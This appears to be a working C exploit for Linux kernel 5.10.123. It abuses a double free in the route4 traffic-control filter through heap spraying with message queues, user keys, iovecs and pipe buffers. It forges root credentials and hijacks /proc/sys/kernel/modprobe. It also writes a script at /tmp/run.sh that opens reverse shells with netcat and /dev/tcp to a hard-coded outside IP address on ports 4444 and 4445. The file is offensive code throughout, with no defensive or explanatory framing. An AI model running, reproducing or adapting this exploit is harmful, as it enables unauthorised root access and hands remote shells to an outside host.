#define _GNU_SOURCE

#include <arpa/inet.h>
#include <assert.h>
#include <dirent.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mount.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/epoll.h>
#include <time.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/shm.h>
#include <sys/timerfd.h>
#include <sys/resource.h>
#include <linux/tc_ematch/tc_em_meta.h>
#include <linux/capability.h>
#include <linux/futex.h>
#include <linux/genetlink.h>
#include <linux/if_addr.h>
#include <linux/if_ether.h>
#include <linux/if_link.h>
#include <linux/if_tun.h>
#include <linux/in6.h>
#include <linux/ip.h>
#include <linux/neighbour.h>
#include <linux/net.h>
#include <linux/netlink.h>
#include <linux/pkt_cls.h>
#include <linux/pkt_sched.h>
#include <linux/rtnetlink.h>
#include <linux/tcp.h>
#include <linux/veth.h>
#include <linux/kcmp.h>
#include <x86intrin.h>
#include <fcntl.h>
#include <poll.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/utsname.h>
#include <err.h>
#include <pthread.h>
#include <keyutils.h>

#define PAGE_SIZE 0x1000
#define RLIMIT_FILE 0x3000
#define MAX_PIPE_NUM 0x400
#define MAX_PIPE_SPRAY 0x300
#define PIPE_PAGE_NUM 0x1000
#define MAX_PROCESS_NUM 0x400

#define DEBUG
#define MSG

#define MAX_KEY_SPRAY 0x80


int pipe_priv[2][2];
int pipes[MAX_PIPE_NUM][2];
int pipe_pages[PIPE_PAGE_NUM][2];
key_serial_t keys[MAX_KEY_SPRAY];

int cpu_cores = 0;
int sockfd = -1;
void *global_data;
void *global_buffer;
unsigned long heap = 0;
unsigned long kaslr = 0;

// for kctf kernel 5.10.123
unsigned long root_user = 0xffffffff82657f60;
unsigned long init_user_ns = 0xffffffff82657fe0;
unsigned long init_groups = 0xffffffff826595a8;
unsigned long pipe_ops = 0xffffffff8222bd00;

struct cred {
  int32_t usage;
  int32_t subscribers;
  void *put;
  unsigned magic;
  char uid[77];
  void *keyring[4];
  unsigned long security;
  unsigned long user;
  unsigned long user_ns;
  unsigned long group;
  int rcu;
};

void DumpHex(const void *data, size_t size) {
#ifdef DEBUG
  char ascii[17];
  size_t i, j;
  ascii[16] = '\0';
  for (i = 0; i < size; ++i) {
    printf("%02X ", ((unsigned char *)data)[i]);
    if (((unsigned char *)data)[i] >= ' ' &&
        ((unsigned char *)data)[i] <= '~') {
      ascii[i % 16] = ((unsigned char *)data)[i];
    } else {
      ascii[i % 16] = '.';
    }
    if ((i + 1) % 8 == 0 || i + 1 == size) {
      printf(" ");
      if ((i + 1) % 16 == 0) {
        printf("|  %s \n", ascii);
      } else if (i + 1 == size) {
        ascii[(i + 1) % 16] = '\0';
        if ((i + 1) % 16 <= 8) {
          printf(" ");
        }
        for (j = (i + 1) % 16; j < 16; ++j) {
          printf("   ");
        }
        printf("|  %s \n", ascii);
      }
    }
  }
#endif
}

void msleep(unsigned int time) {
  usleep(time*1000);
}

void pin_on_cpu(int cpu) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(cpu, &cpu_set);
  if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0) {
    perror("sched_setaffinity()");
    exit(EXIT_FAILURE);
  }
  usleep(1000);
}

static bool write_file(const char *file, const char *what, ...) {
  char buf[1024];
  va_list args;
  va_start(args, what);
  vsnprintf(buf, sizeof(buf), what, args);
  va_end(args);
  buf[sizeof(buf) - 1] = 0;
  int len = strlen(buf);
  int fd = open(file, O_WRONLY | O_CLOEXEC);
  if (fd == -1)
    return false;
  if (write(fd, buf, len) != len) {
    int err = errno;
    close(fd);
    errno = err;
    return false;
  }
  close(fd);
  return true;
}

static void adjust_rlimit() {
  struct rlimit rlim;
  // rlim.rlim_cur = rlim.rlim_max = (200 << 20);
  // setrlimit(RLIMIT_AS, &rlim);
  // rlim.rlim_cur = rlim.rlim_max = 32 << 24;
  // setrlimit(RLIMIT_MEMLOCK, &rlim);
  // rlim.rlim_cur = rlim.rlim_max = 136 << 20;
  // // setrlimit(RLIMIT_FSIZE, &rlim);
  // rlim.rlim_cur = rlim.rlim_max = 1 << 20;
  // setrlimit(RLIMIT_STACK, &rlim);
  // rlim.rlim_cur = rlim.rlim_max = 0;
  // setrlimit(RLIMIT_CORE, &rlim);
  rlim.rlim_cur = rlim.rlim_max = RLIMIT_FILE;
  if (setrlimit(RLIMIT_NOFILE, &rlim) < 0) {
      perror("setrlimit");
  }
}

void setup_namespace() {
  int real_uid = getuid();
  int real_gid = getgid();

  if (unshare(CLONE_NEWUSER) != 0) {
    perror("[-] unshare(CLONE_NEWUSER)");
    exit(EXIT_FAILURE);
  }

  if (unshare(CLONE_NEWNET) != 0) {
    perror("[-] unshare(CLONE_NEWUSER)");
    exit(EXIT_FAILURE);
  }

  if (!write_file("/proc/self/setgroups", "deny")) {
    perror("[-] write_file(/proc/self/set_groups)");
    exit(EXIT_FAILURE);
  }
  if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)) {
    perror("[-] write_file(/proc/self/uid_map)");
    exit(EXIT_FAILURE);
  }
  if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
    perror("[-] write_file(/proc/self/gid_map)");
    exit(EXIT_FAILURE);
  }
}


#define NLMSG_TAIL(nmsg)                                                       \
  ((struct rtattr *)(((void *)(nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))

int addattr(char *attr, int type, void *data, int len) {
  struct rtattr *rta = (struct rtattr*)attr;

  rta->rta_type = type;
  rta->rta_len = RTA_LENGTH(len);
  if (len) {
    memcpy(RTA_DATA(attr), data, len);
  }

  return RTA_LENGTH(len);
}

int addattr_l(struct nlmsghdr *n, int maxlen, int type, const void *data,
              int alen) {
  int len = RTA_LENGTH(alen);
  struct rtattr *rta;

  if (NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len) > maxlen) {
    fprintf(stderr, "addattr_l ERROR: message exceeded bound of %d\n", maxlen);
    return -1;
  }
  rta = NLMSG_TAIL(n);
  rta->rta_type = type;
  rta->rta_len = len;
  if (alen)
    memcpy(RTA_DATA(rta), data, alen);
  n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len);
  return 0;
}

struct rtattr *addattr_nest(struct nlmsghdr *n, int maxlen, int type) {
  struct rtattr *nest = NLMSG_TAIL(n);

  addattr_l(n, maxlen, type, NULL, 0);
  return nest;
}

int addattr_nest_end(struct nlmsghdr *n, struct rtattr *nest) {
  nest->rta_len = (void *)NLMSG_TAIL(n) - (void *)nest;
  return n->nlmsg_len;
}

int add_qdisc(int fd) {
  char *start = malloc(0x1000);
  memset(start, 0, 0x1000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // new qdisc
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;
  msg->nlmsg_type = RTM_NEWQDISC;
  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));
  // set local
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_parent = TC_H_ROOT;
  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);

  addattr_l(msg, 0x1000, TCA_KIND, "sfq", 4);

  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };
  return sendmsg(fd, &msgh, 0);
}

int add_tc_(int fd, u_int32_t from, u_int32_t to, u_int32_t handle, u_int16_t flags) {
  char *start = malloc(0x2000);
  memset(start, 0, 0x2000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // new filter
  msg = msg + msg->nlmsg_len;
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | flags;
  msg->nlmsg_type = RTM_NEWTFILTER;
  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_handle = handle;

  addattr_l(msg, 0x1000, TCA_KIND, "route", 6);
  struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);
  addattr_l(msg, 0x1000, TCA_ROUTE4_FROM, &from, 4);
  addattr_l(msg, 0x1000, TCA_ROUTE4_TO, &to, 4);
  addattr_nest_end(msg, tail);

  // packing
  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };

  sendmsg(fd, &msgh, 0);

  free(start);
  return 1;
}

void add_tc(int sockfd, uint32_t handle, uint16_t flag) {
  add_tc_(sockfd, 0, handle, (handle<<8) + handle, flag);
}

// -------------- exploitation --------------------

void *do_iov_spray(void *idx) {
  unsigned long pipe_idx = (unsigned long)(idx);
  pin_on_cpu(0);

  char data[0x10] = {};
  struct iovec iovec_array[192/16];
  assert(sizeof(iovec_array) == 192);

  // printf("thread %ld created\n", pipe_idx);

  for (int i=0; i<192/16; i++) {
    iovec_array[i].iov_len = 1;
    iovec_array[i].iov_base = (void *)((char *)global_data + pipe_idx);
  }

spray_192:
  assert(read(pipes[pipe_idx][0], data, 1) == 1);
  write(pipe_pages[0][1], data, 1);
  // printf("spraying %ld\n", pipe_idx);

  if (pipe_idx >= MAX_PIPE_SPRAY) {
    pin_on_cpu(pipe_idx % cpu_cores);
  }

  if (data[0] == 0x0) {
    readv(pipes[pipe_idx][0], iovec_array, 192/16);
    if (*(char *)iovec_array->iov_base == 1) {
      printf("pipe %ld freed\n", pipe_idx);
    }
    write(pipe_pages[0][1], data, 1);
  } else {
    for (int i=0; i<192/16; i++) {
      iovec_array[i].iov_len = 1;
      // leak with user key
      iovec_array[i].iov_base = (void *)((char *)global_data + 0x800);
    }
    readv(pipes[pipe_idx][0], iovec_array, 192/16);
    write(pipe_pages[0][1], data, 1);
  }
  while (1) {
    sleep(10000);
  }
}


void pre_exploit() {
  cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);
  pin_on_cpu(0);
  adjust_rlimit();

  if (pipe(pipe_priv[0]) < 0) {
    err(1, "pipe");
  }

  if (pipe(pipe_priv[1]) < 0) {
    err(1, "pipe");
  }

  for (int i=0; i<MAX_PROCESS_NUM; i++) {
    if (!fork()) {
      int pid = getpid();
      // make sure our old cred is not freed
      pin_on_cpu(0);
      int fd = open("/dev/null", 0);
      assert(fd > 0);

      while (1) {
        int c[2];
        read(pipe_priv[0][0], c, sizeof(c));
        if (c[0] == 0x1) {
          setuid(getuid());
          msleep(10);
          write(pipe_priv[1][1], c, 1);
        } else if (c[0] == 0x2) {
          // escalated
          printf("uid %d\n", getuid());
          getchar();
          for (int i=1000; i<29999; i++) {
            printf("trying %d\n", i);
            write_file("/proc/sys/kernel/modprobe", "/proc/%d/root/tmp/run.sh", i);
            
            write(pipe_priv[1][1], c, 1);
            read(pipe_priv[0][0], c, 1);
            msleep(10);
          }
        } else if (c[0] == 0x3) {
          struct __user_cap_header_struct header;
          header.pid = pid;
          header.version = _LINUX_CAPABILITY_VERSION; // _LINUX_CAPABILITY_VERSION_3;

          struct __user_cap_data_struct useradata;
          syscall(SYS_capget, &header, &useradata);
          if (!useradata.effective || useradata.effective == 0xffffffff) {
            // exit other processes
            pin_on_cpu(i%cpu_cores);
            write(pipe_priv[1][1], c, 1);
            setuid(getuid());
            exit(0);
          }
          printf("pid %d i %d eff %x permit %x inher %x\n", pid, i, useradata.effective, useradata.permitted, useradata.inheritable);
          write(pipe_priv[1][1], c, 1);
          sleep(8);
        }

        usleep(1000*10);
      }
    }
  }

  sleep(1);

  printf("priv process prepared\n");

  global_buffer = mmap(NULL,
                     0x4000,
                     PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
                     -1,
                     0);
  global_data = mmap((void *)0x10000,
                     0x4000,
                     PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
                     -1,
                     0);
  printf("global data at %p, global buffer at %p\n", global_data, global_buffer);

  setup_namespace();

  system("rm -rf /tmp/run.sh");
  int fd = open("/tmp/run.sh", O_WRONLY | O_CREAT);
  assert(fd > 0);
  char shell[] = "#!/bin/bash\necho `id`\nnc -e /bin/sh 129.80.169.179 4444\nbash -i >& /dev/tcp/129.80.169.179/4445 0>&1";
  write(fd, shell, sizeof(shell));
  close(fd);
  system("chmod 777 /tmp/run.sh");

  for (int i = 0; i < MAX_PIPE_NUM; i++) {
    if (pipe(pipes[i]) < 0) {
      err(1, "pipe");
    }
    fcntl(pipes[i][1], F_SETPIPE_SZ, 0x1000);
    // prefault the page
    write(pipes[i][1], global_buffer, 1);
    read(pipes[i][0], global_buffer, 1);
  }

  for (int i=0; i < 0x40; i++) {
    if (pipe(pipe_pages[i]) < 0) {
      err(1, "pipe page");
    }
    // fcntl(pipe_pages[i][1], F_SETPIPE_SZ, 0x1000);
  }

  for (unsigned long i=0; i<MAX_PIPE_NUM; i++) {
    pthread_t pid;
    int res = pthread_create(&pid, NULL, do_iov_spray, (void *)i);
    assert(res == 0);
  }
}


void escalate() {

  printf("escalating...\n");
  int cnt = 0;
  pin_on_cpu(0);

  sockfd = socket(PF_NETLINK, SOCK_RAW, 0);
  assert(sockfd != -1);
  add_qdisc(sockfd);

  // add this filter to avoid allocating noise in the middle
  add_tc_(sockfd, 0, 0x7f, 0x7f7f, NLM_F_EXCL | NLM_F_CREATE);

  // first part
  char data[2] = {};
  for (int i=0; i<MAX_PIPE_SPRAY/2-0x80; i++) {
    write(pipes[i][1], data, 1);
  }
  cnt = (MAX_PIPE_SPRAY/2-0x80);
  while (cnt) {
    int res = read(pipe_pages[0][0], global_buffer, cnt);
    cnt -= res;
    // printf("res %d cnt %d\n", res, cnt);
  }
  printf("first part spray iov  done\n");

  // allocate one in the page of vuln obj
  write(pipes[MAX_PIPE_SPRAY/2-0x80][1], data, 1);
  read(pipe_pages[0][0], global_buffer, 1);

  add_tc_(sockfd, 0, 0, 0, NLM_F_EXCL | NLM_F_CREATE);
  // second part

  for (int i=MAX_PIPE_SPRAY/2-0x80+1; i<MAX_PIPE_SPRAY; i++) {
    write(pipes[i][1], data, 1);
  }

  cnt = MAX_PIPE_SPRAY - MAX_PIPE_SPRAY/2+0x80-1;
  while (cnt) {
    int res = read(pipe_pages[0][0], global_buffer, cnt);
    cnt -= res;
    // printf("res %d cnt %d\n", res, cnt);
  }

  puts("second part spray iov done");
#ifdef MSG

  struct msg {
    long mtype;
    char data[];
  };
  // use msg for stable
  int msg_ids[0x100];
  for (int i=0; i<0x200; i++)
    msg_ids[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);

#endif

  // free in cpu 0 first
  add_tc_(sockfd, 0x12, 0x13, 0, NLM_F_CREATE);
  msleep(100);

#ifdef MSG
  struct msg *m = (struct msg*) global_buffer;
  m->mtype = 1;
  memset(m->data, 0, 0x100);
  *(uint32_t*)((char*)m + 0x40 - 40) = 0;
  *(uint64_t *)((char*)m + 0x30 - 40) = 0xfffffe000000d000;

  for (int i=0; i<0x100; i++) {
    pin_on_cpu(i%cpu_cores);
    if (msgsnd(msg_ids[i], (void *)m, 192-48, 0) != 0) {
      err(1, "msgsnd");
    }
  }

  pin_on_cpu(0);

  // double free
  add_tc_(sockfd, 0x11, 0x13, 0, NLM_F_CREATE);
  msleep(100);
  printf("double free done\n");

  int idx = -1;
  for (int i=0; i<0x100; i++) {
    if(msgrcv(msg_ids[i], global_data+0x100, 192-48, 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY) < 0) {
      perror("msgrcv");
    }
    uint64_t *leaked = (uint64_t*)(global_data+0x100);
    if (leaked[7] && leaked[8] && leaked[9]) {
      heap = leaked[8]-0x60;
      uint64_t route4_delete = leaked[9];
      idx = i;
      printf("found heap at 0x%lx, route4_delete at 0x%lx\n", heap, route4_delete);
      heap += 0x88;
      break;
    }
  }
  assert(idx != -1);

  m->mtype = 1;
  for (int i=0x100; i<0x200; i++) {
    pin_on_cpu(i%cpu_cores);
    m->data[0] = i;
    if (msgsnd(msg_ids[i], (void *)m, 192-48, 0) != 0) {
      err(1, "msgsnd");
    }
  }
  pin_on_cpu(0);

  if(msgrcv(msg_ids[idx], m, 192-48, 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY) < 0) {
      perror("msgrcv");
  }

  printf("overlapped with msg %d\n", m->data[0]);
  assert(m->data[0] != 0);

  // delete msg
  if(msgrcv(msg_ids[idx], (void*)m, 192-48, 1, MSG_NOERROR | IPC_NOWAIT) < 0) {
    err(1, "freeing msgrcv");
  }
  printf("msg freed\n");
#endif

  // now, reclaim with user key payload
  memset(global_buffer, 0, 192);
  for (int i=0; i<MAX_KEY_SPRAY; i++) {
    char buf[10];
    snprintf(buf, 10, "%d", i);

    *(uint32_t*)((char*)global_buffer + 0x40 - 24) = 0;
    *(uint64_t *)((char*)global_buffer + 0x30 - 24) = 0xfffffe000000d000; // a kernel accessible addr
#ifndef MSG
    pin_on_cpu(i % cpu_cores);
#endif
    keys[i] = add_key("user", buf, global_buffer, 129, KEY_SPEC_THREAD_KEYRING);
    if (keys[i] < 0) {
      warn("adding key");
    }
  }
  pin_on_cpu(0);

  printf("key spray done\n");

  // double free
  add_tc_(sockfd, 0x11, 0x13, 0, NLM_F_CREATE);
  msleep(100);
  printf("double free done\n");

  // now spray iov to overlap with keys
  data[0] = 0x1;
  for(int i=MAX_PIPE_SPRAY; i<MAX_PIPE_NUM; i++) {
    write(pipes[i][1], data, 1);
  }
  cnt = MAX_PIPE_NUM-MAX_PIPE_SPRAY;
  while (cnt) {
    int res = read(pipe_pages[0][0], global_buffer, cnt);
    cnt -= res;
    // printf("res %d cnt %d\n", res, cnt);
  }
  
  pin_on_cpu(0);

  // now leak kernel data
  int corrupted_key_id = -1;
  for (int i=0; i<MAX_KEY_SPRAY; i++) {
    int res = keyctl_read(keys[i], global_buffer, 129);
    if (res != 129) {
      corrupted_key_id = i;
      printf("key overlapped, res %d\n", res);
      if (res != 0x800) {
        printf("please rerun...\n");
        // for (int j=0; j<MAX_KEY_SPRAY; j++)
        //   keyctl_revoke(keys[j]);
        getchar();
      }
      // keyctl_read(keys[i], global_buffer, 0x800);
      DumpHex(global_buffer, 0x200);
      break;
    }
  }
  for (int i=0; i<MAX_KEY_SPRAY; i++) {
    if (i == corrupted_key_id) continue;
    keyctl_revoke(keys[i]);
  }

  if (corrupted_key_id == -1) {
    printf("no key overlop\n");
    getchar();
  }
  keyctl_read(keys[corrupted_key_id], global_buffer, 0x800);
  DumpHex(global_buffer, 0x200);
  uint64_t *leaked = global_buffer;
  int pipe_overlap = leaked[25] - (uint64_t)global_data;
  printf("found pipe idx at %d\n", pipe_overlap);
  if (pipe_overlap < 0) {
    getchar();
  }

  // free pipe
  memset(global_buffer, 0x1, 192);
  write(pipes[pipe_overlap][1], global_buffer, 192/16);
  cnt = 1;
  while (cnt) {
    int res = read(pipe_pages[0][0], global_buffer, 1);
    assert(res >= 0);
    cnt -= res;
    // printf("res %d cnt %d\n", res, cnt);
  }

  pin_on_cpu(0);

  memset(global_buffer, 0, 0x1000);
  keyctl_read(keys[corrupted_key_id], global_buffer, 0x800);
  DumpHex(global_buffer, 0x200);

  printf("now spray pipe buffer...\n");
  // now spray pipe_buffer
  for (int i=1; i<20; i++) {
    int res = fcntl(pipe_pages[i][1], F_SETPIPE_SZ, 0x4000);
    if (res < 0) {
      warn("fnctl %d\n", i);
    } else {
      // printf("res %lx\n", res);
    }
  }
  
  for (int i=1; i<20; i++) {
    write(pipe_pages[i][1], global_buffer, 1);
  }
  
  memset(global_buffer, 0, 0x1000);
  keyctl_read(keys[corrupted_key_id], global_buffer, 0x800);
  // DumpHex(global_buffer, 0x200);

  unsigned long page = leaked[21];
  unsigned long pipe_ops_ = leaked[23];
  // if (!heap) {
    heap = page & 0xfffffffff0000000l;
    heap += 0x10;
  // }
  printf("got page at %lx pipe ops at %lx\n", page, pipe_ops_);
  printf("guessed good heap at %lx\n", heap);
  //kaslr = pipe_ops_ - pipe_ops;
  kaslr = 0;
  printf("kaslr : %lx\n", kaslr);


  printf("now cross cache\n");
  // getchar();

  // now cross cache
  for (int i=1; i<20; i++) {
    fcntl(pipe_pages[i][1], F_SETPIPE_SZ, 0x2000);
    usleep(500);
  }

  keyctl_revoke(keys[corrupted_key_id]);
  msleep(100);

  for (int i=0; i<MAX_PIPE_SPRAY; i++) {
    write(pipes[i][1], global_buffer, 192/16);
    usleep(100);
  }
  cnt = MAX_PIPE_SPRAY-1;
  while (cnt) {
    int res = read(pipe_pages[0][0], global_buffer, cnt);
    cnt -= res;
    // printf("res %d cnt %d\n", res, cnt);
  }

  printf("freed cache done\n");

  // now reclaim pages with cred
  int cmd[2] = {0x1, 0x0};
  for (int i=0; i<MAX_PROCESS_NUM; i++) {
    write(pipe_priv[0][1], cmd, sizeof(cmd));
  }

  cnt = MAX_PROCESS_NUM;
  while (cnt) {
    int res = read(pipe_priv[1][0], global_buffer, cnt);
    cnt -= res;
    // printf("res %d cnt %d\n", res, cnt);
  }
  
  printf("cred spray done\n");
  
  // now init pipe page
  for (int i=0x40; i<PIPE_PAGE_NUM; i++) {
    if (pipe(pipe_pages[i]) < 0) {
      err(1, "pipe page");
    }
  }
  for (int i=1; i<20; i++) {
    read(pipe_pages[i][0], global_buffer, 1);
  }

  for (int i=MAX_PIPE_SPRAY; i<MAX_PIPE_NUM; i++) {
    write(pipes[i][1], global_buffer, 192/16);
  }
  cnt = MAX_PIPE_NUM - MAX_PIPE_SPRAY;
  while (cnt) {
    int res = read(pipe_pages[0][0], global_buffer, cnt);
    cnt -= res;
    // printf("res %d cnt %d\n", res, cnt);
  }
  printf("cred freed\n");

  // now check cred
  cmd[0] = 0x3;
  for (int i=0; i<MAX_PROCESS_NUM; i++)
    write(pipe_priv[0][1], cmd, sizeof(cmd));
  
  // wait for child
  cnt = MAX_PROCESS_NUM;
  while (cnt) {
    int res = read(pipe_priv[1][0], global_buffer, cnt);
    cnt -= res;
  }
  // getchar();
  
  // now spray pages
  struct cred *root_cred = (struct cred *)(global_data);
  root_cred->usage = 0xbb;
  root_cred->subscribers = 0xbb;
  root_cred->user_ns = init_user_ns + kaslr;
  root_cred->user = root_user + kaslr;
  root_cred->group = init_groups + kaslr;
  root_cred->magic = 0x43736564;
  root_cred->security = heap;

  for (int i=1; i*192 < 0x1200; i++) {
    memcpy((char*)global_data + i*192, root_cred, 192);
  }

  for (int i=1; i<PIPE_PAGE_NUM; i++) {
    // printf("writing to page %d\n", i);
    pin_on_cpu(i%cpu_cores);
    for (int j=0; j<2; j++) {
      write(pipe_pages[i][1], global_data, 0x1000);
    }
  }
  printf("pipe page done\n");

  cmd[0] = 0x2;
  write(pipe_priv[0][1], cmd, sizeof(cmd));
  puts("write done");
  int x = 0;
  while(1) {
    read(pipe_priv[1][0], cmd, 1);
    printf("trigger modprobe %d...\n", x++);
    socket(23, AF_INET, 0);
    write(pipe_priv[0][1], cmd, 1);
  }
}

int main() {
  pre_exploit();
  puts("pre_exploit done");
  escalate();
}
